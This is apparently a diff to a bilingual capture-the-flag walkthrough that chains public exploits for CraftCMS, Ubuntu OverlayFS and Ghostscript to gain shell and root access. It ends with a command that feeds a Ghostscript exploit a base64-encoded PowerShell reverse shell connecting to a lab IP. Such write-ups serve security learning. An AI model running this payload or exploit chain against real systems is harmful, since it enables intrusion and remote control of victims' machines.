@@ -305,6 +305,7 @@ I came across this web page with little to no responsiveness, I checked the exte
 ![](https://miro.medium.com/v2/resize:fit:700/1*Vqoute0L2FBCw1aypZaqZQ.png)
 
 So I embark on the search for a publicly available exploit POC that might exist for that particular CMS version. I found a POC by a researcher named ‘Faelian’ on his github and realized the vulnerability was assigned a CVE name of [CVE-2023–41892](https://github.com/Faelian/CraftCMS_CVE-2023-41892).  
+#CraftCMSCVECVE-2023-41892
 因此，我开始寻找该特定 CMS 版本可能存在的公开可用的漏洞利用 POC。我在他的 github 上发现了一个名为“Faelian”的研究人员的 POC，并意识到该漏洞被分配了 CVE 名称 CVE-2023–41892 。
 
 ## Gaining Shell
@@ -608,7 +609,8 @@ VERSION_CODENAME=lunar
 ...
 ...
 ```
-找到[Issues · g1vi/CVE-2023-2640-CVE-2023-32629 --- 问题 ·g1vi/CVE-2023-2640-CVE-2023-32629 (github.com)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) #Ghostscript命令注入漏洞
+找到[Issues · g1vi/CVE-2023-2640-CVE-2023-32629 --- 问题 ·g1vi/CVE-2023-2640-CVE-2023-32629 (github.com)](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629) 
+#Over（lay）UbuntuCVE-2023-2640-CVE-2023-32629权限提升
 进行EXP的利用，拿到rootshell:
 ![[Pasted image 20240407183625.png]]
 翻找home及root并未找到userflag
@@ -623,6 +625,7 @@ VERSION_CODENAME=lunar
 ![[Pasted image 20240407184000.png]]
 提到需要设计一个针管模型，要以eps格式发送，且会被GhoustScript可视化，搜索GhostScriptCVE:
 [jakabakos/CVE-2023-36664-Ghostscript-command-injection: Ghostscript command injection vulnerability PoC (CVE-2023-36664) --- jakabakos/CVE-2023-36664-Ghostscript-command-injection：Ghostscript 命令注入漏洞 PoC （CVE-2023-36664） (github.com)](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/tree/main)
+#Ghostscript命令注入漏洞CVE-2023-36664
 ```sh
 ┌──(root㉿Cam311ia)-[~/WEBC/exp/CVE-2023-36664-Ghostscript-command-injection]
 └─# python3 exploit.py --generate --payload='powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAzACIALAA0ADIANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' --filename='imgay' --extension='eps'
